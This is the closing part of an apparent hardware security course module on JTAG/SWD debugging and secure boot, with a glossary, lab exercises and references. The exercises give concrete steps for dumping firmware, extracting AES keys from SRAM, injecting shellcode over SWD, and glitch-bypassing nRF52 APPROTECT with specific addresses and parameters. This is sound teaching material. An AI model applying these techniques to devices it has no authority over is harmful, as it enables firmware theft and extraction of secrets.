| Domain 17B (Fault Injection) | Voltage/EM glitching, secure boot bypass | FI targets the verification described in §5; glitch timing determined by boot power profiling; STM32/nRF52/ESP32 bypass are specific FI applications |
| Domain 17C (PCB RE) | Test point identification, memory extraction | Debug interface discovery (§4) depends on PCB RE for pin identification; memory extraction (17C §5) produces firmware images protected by secure boot |
| Domain 15 (Mobile Security) | iOS SecureBoot, Android Verified Boot | iOS checkm8 (§6.1) covered in depth in Domain 15B; Android AVB (§5.6) covered in Domain 15A including dm-verity and bootloader unlocking |
| Domain 27 (Defensive Architecture) | TPM, measured boot, remote attestation | TPM PCR extension and remote attestation (§7.2 of this chapter) covered in depth in Domain 27A; boot-integrity monitoring feeds into Domain 27C SIEM/SOAR |
| Domain 7B (Hardware Vulnerabilities) | Intel CSME, AMD PSP vulnerabilities | CVE-2019-0090 (CSME BootROM) and AMD PSP CVE-2021-26311 compromise platform root of trust at silicon level, undermining Boot Guard and fTPM |

---

## 17. Glossary

| Term | Definition |
|---|---|
| **TAP (Test Access Port)** | IEEE 1149.1 interface consisting of TCK, TMS, TDI, TDO, and optional TRST signals; controlled by a 16-state finite state machine |
| **IDCODE** | 32-bit JTAG device identification register containing manufacturer ID (JEDEC JEP106), part number, and version — primary identifier for unknown devices |
| **Boundary Scan** | IEEE 1149.1 capability to drive and observe IC pins via JTAG shift registers, enabling board-level interconnect testing and pin-function identification |
| **SWD (Serial Wire Debug)** | ARM-specific 2-wire debug protocol (SWDIO + SWCLK) providing the same debug functionality as JTAG with fewer pins; default on ARM Cortex-M |
| **MEM-AP** | Memory Access Port — ARM CoreSight component providing read/write access to the target's full address space via CSW/TAR/DRW registers |
| **ROM Table** | Discoverable CoreSight data structure listing all debug components with base addresses and identification registers (PIDR, CIDR, DEVTYPE) |
| **DBGEN/SPIDEN** | ARM debug authentication signals: DBGEN controls non-secure invasive debug; SPIDEN controls secure-world invasive debug — typically driven by OTP fuses |
| **ETM (Embedded Trace Macrocell)** | CoreSight component generating cycle-accurate instruction/data trace; reveals exact execution path through security-critical code when enabled |
| **Chain of Trust** | Secure boot model where each stage cryptographically verifies the next before executing; security depends entirely on the immutable hardware root |
| **BootROM** | Mask ROM containing the first code executed after power-on; immutable and unpatchable — vulnerabilities (e.g., checkm8) affect all manufactured units |
| **UEFI Secure Boot** | Firmware-level boot verification using PK/KEK/db/dbx key hierarchy to prevent execution of unsigned bootloaders and drivers |
| **Boot Guard** | Intel hardware-rooted secure boot: CPU ACM verifies IBB against a key hash burned into CPU fuses; unfixable if misconfigured at manufacture |
| **HABv4** | NXP High Assurance Boot v4: BootROM verifies CSF signatures against SRK hash in OTP fuses; Open vs. Closed mode controls enforcement |
| **checkm8** | Use-after-free vulnerability (CVE-2019-8900) in Apple BootROM USB DFU handler; affects A5–A11 SoCs; unpatchable; basis for checkra1n jailbreak |
| **RDP (Readout Protection)** | STM32 flash protection mechanism: Level 0 (none), Level 1 (debug read blocked, mass-erase reverts to L0), Level 2 (permanent, irreversible debug disable) |

---

## Exercises

**Exercise 1 — JTAG/SWD Debug Port Discovery and Access with OpenOCD.**
Using a JTAGulator and an FTDI-based debug probe (or ST-Link v2) against an unknown ARM Cortex-M target board: (a) Connect the JTAGulator to 8–12 candidate test points on the PCB. Run the IDCODE scan to identify valid TCK/TMS/TDI/TDO pin assignments. Record the IDCODE and decode the JEDEC manufacturer ID and part number. (b) If JTAG is not found, run the BYPASS scan. If still unsuccessful, attempt SWD discovery: connect SWDIO and SWCLK candidates and probe with `openocd -c "transport select swd"`. (c) Once the debug interface is identified, launch OpenOCD with the appropriate adapter and target configuration. Read the DPIDR and enumerate the ROM Table using `dap info`. List all CoreSight components (ETM, CTI, ITM, TPIU) with their base addresses. (d) Halt the CPU, dump the register file (`reg`), and read 256 bytes from the flash base address (`mdw`). (e) Set a hardware breakpoint at the reset vector, resume, and trigger a reset. Verify the breakpoint fires. Document the full debug access chain.

**Exercise 2 — Firmware Dump and RAM Secret Extraction via SWD.**
Using an STM32F407 Discovery board with a custom firmware: (a) Connect via SWD using pyOCD. Read the CPUID register (`read32 0xE000ED00`) and DBGAUTHSTATUS (`read32 0xE000EFB8`) to verify debug access level. (b) Dump the entire flash (1 MB) using `savemem 0x08000000 0x100000 firmware.bin`. Verify the dump with `binwalk firmware.bin` to confirm valid firmware structure. (c) Dump the full SRAM (192 KB) using `savemem 0x20000000 0x30000 sram.bin`. Search the SRAM dump for AES key schedules using `aeskeyfind sram.bin`. (d) Using OpenOCD, manipulate a peripheral register: disable the watchdog timer by writing to the IWDG registers, then reconfigure a GPIO pin to toggle an LED as proof of peripheral control. (e) Inject code: write a small shellcode payload to SRAM (`mww` commands), redirect the PC to the payload address (`reg pc 0x20010000`), and resume. Verify the injected code executes.

**Exercise 3 — CoreSight ETM Trace Capture and Analysis.**
Using a J-Link or DSTREAM probe with ETM/SWO capability against an STM32F4 target: (a) Configure the ITM (Instrumentation Trace Macrocell) for SWO output at 2 MHz. Use `JLinkSWOViewer` or pyOCD's SWO support to capture ITM stimulus port 0 output. Verify that the target's debug `printf` output is visible. (b) If ETM is available (J-Trace or equivalent), configure ETM to trace instruction execution for a specific address range (the main loop function). Capture a trace of 10,000 instructions. (c) Analyze the trace to identify the execution flow: function calls, conditional branches taken/not-taken, and loop iteration counts. (d) Target a security-critical function (a simulated password comparison): use the trace to determine exactly which instructions execute during a correct vs. incorrect password attempt. Identify the conditional branch that decides pass/fail. (e) Document how ETM trace reveals the timing and location of security checks, enabling targeted fault injection (cross-reference Domain 17B) or code patching.

**Exercise 4 — Secure Boot Bypass Chain: nRF52 APPROTECT Glitch.**
Using an nRF52832 DK board and a ChipWhisperer-Husky: (a) Program the nRF52 with a test firmware and enable APPROTECT by writing 0x00 to UICR address 0x10001208 using `nrfjprog --memwr 0x10001208 --val 0x00`. Verify debug is locked: `pyocd commander -t nrf52832` should fail with a FAULT response. (b) Connect the ChipWhisperer glitch output to the nRF52's VDD (remove or desolder any large decoupling capacitors near the MCU). (c) Profile the nRF52's boot power trace: capture the power consumption during the first 50 microseconds after reset to identify the APPROTECT check timing window. (d) Sweep glitch parameters (ext_offset 500–3000, width 5–25%) targeting the identified window. Use the automated glitch-and-probe script from this module to detect successful bypass (pyOCD connection succeeds and DBGAUTHSTATUS shows debug enabled). (e) On successful bypass, immediately dump the full flash (`savemem 0x00000000 0x80000 nrf52_firmware.bin`). Document the successful parameters, success rate, and number of attempts. Discuss Nordic's hardware mitigation in newer revisions.

**Exercise 5 — UEFI Secure Boot and Boot Guard Audit with chipsec.**
Using a test x86 system (physical or VM with UEFI): (a) Install chipsec (`pip install chipsec`) and run the Secure Boot module: `chipsec_main --module common.secureboot.variables`. Verify the PK, KEK, db, and dbx contents. (b) Run the Boot Guard verification module: `chipsec_main --module common.cpu.ia_untrusted`. Check whether Boot Guard is provisioned, the enforcement mode (verified vs. measured), and the key hash in the FPFs. (c) Enumerate the UEFI variables related to Secure Boot using `chipsec_util uefi var-list`. Identify any non-standard variables that could indicate vendor-specific security configurations. (d) Test the Secure Boot enforcement: attempt to boot an unsigned UEFI shell from USB. Verify that Secure Boot rejects it. Then enroll the UEFI shell's hash into db (using `mokutil` or UEFI setup) and verify it boots. (e) Produce an audit report documenting: Secure Boot status (enabled/disabled), Boot Guard status (provisioned/not, enforcement mode), dbx currency (check against Microsoft's latest dbx update), and recommendations for any misconfigurations found.

---

## Readings and References

1. Payatu. "IoT Security — Hardware Attack Surface: JTAG, SWD." <https://payatu.com/blog/hardware-attack-surface-jtag-swd/> (retrieved: 2026-05-29).
2. Wrongbaud. "Hardware Debugging for Reverse Engineers Part 1: SWD, OpenOCD." <https://wrongbaud.github.io/posts/stm-xbox-jtag/> (retrieved: 2026-05-29).
3. Memfault. "Diving into JTAG — Security (Part 6)." <https://interrupt.memfault.com/blog/diving-into-jtag-part-6> (retrieved: 2026-05-29).
4. HardBreak Wiki. "SWD." <https://www.hardbreak.wiki/hardware-hacking/interface-interaction/jtag-swd/swd> (retrieved: 2026-05-29).
5. HackTricks. "JTAG." <https://hacktricks.wiki/en/todo/hardware-hacking/jtag.html> (retrieved: 2026-05-29).
6. Embedded Artistry. "nRF52 Security Vulnerability: APPROTECT Bypass." <https://embeddedartistry.com/fieldatlas/nrf52-security-vulnerability-approtect-bypass/> (retrieved: 2026-05-29).
7. Matias Soler. "APPROTECT Bypass on NRF52832." <https://www.matiassoler.com/posts/approtect_bypass_nrf52832/> (retrieved: 2026-05-29).
8. atc1441. "ESP32_nRF52_SWD." <https://github.com/atc1441/ESP32_nRF52_SWD> (retrieved: 2026-05-29).
9. Arshon Inc. "JTAG and SWD Debugging Techniques: A Field Guide." <https://arshon.com/blog/jtag-and-swd-debugging-techniques-a-field-guide-for-reliable-bring-up-flashing-and-trace/> (retrieved: 2026-05-29).
10. Synacktiv. "How to Voltage Fault Injection." <https://www.synacktiv.com/en/publications/how-to-voltage-fault-injection> (retrieved: 2026-05-29).
11. PT SWARM. "GigaVulnerability: Readout Protection Bypass on GigaDevice GD32 MCUs." <https://swarm.ptsecurity.com/gigavulnerability-readout-protection-bypass-on-gigadevice-gd32-mcus/> (retrieved: 2026-05-29).
12. NewAE Technology. "ChipWhisperer Tutorials — Fault 101." <https://github.com/newaetech/chipwhisperer-tutorials/blob/master/courses_fault101_SOLN_Fault%202_1%20-%20Introduction%20to%20Voltage%20Glitching-OPENADC-CWLITEARM.rst> (retrieved: 2026-05-29).

---

## Cross-References

| Module | Relationship |
|--------|-------------|
| Domain 17A — Physical and Hardware Security | Foundation module covering side-channel overview, cold boot attacks, evil maid, TEMPEST, and physical access prerequisites |
| Domain 17B — Fault Injection | Voltage/EM glitching techniques used for DBGEN bypass, APPROTECT glitch, RDP bypass, and secure-boot fault injection |
| Domain 17C — PCB RE and Chip Analysis | PCB reverse engineering for test-point identification (JTAG/SWD pads); firmware extraction via flashrom/chip-off preceding debug analysis |
| Domain 12 — Reverse Engineering | Firmware RE (Ghidra, IDA) applied to images dumped via JTAG/SWD or extracted from flash; bootloader analysis for bypass surfaces |
| Domain 13 — Cryptography | Secure-boot signature algorithms (RSA-2048/4096, ECDSA, Ed25519), key hierarchies (PK/KEK/db, SRK fuses), and certificate chain validation |
| Domain 15 — Mobile Security | Mobile platform secure boot (iOS SecureBoot/checkm8, Android Verified Boot, Qualcomm PBL/SBL) and TrustZone debug restrictions |
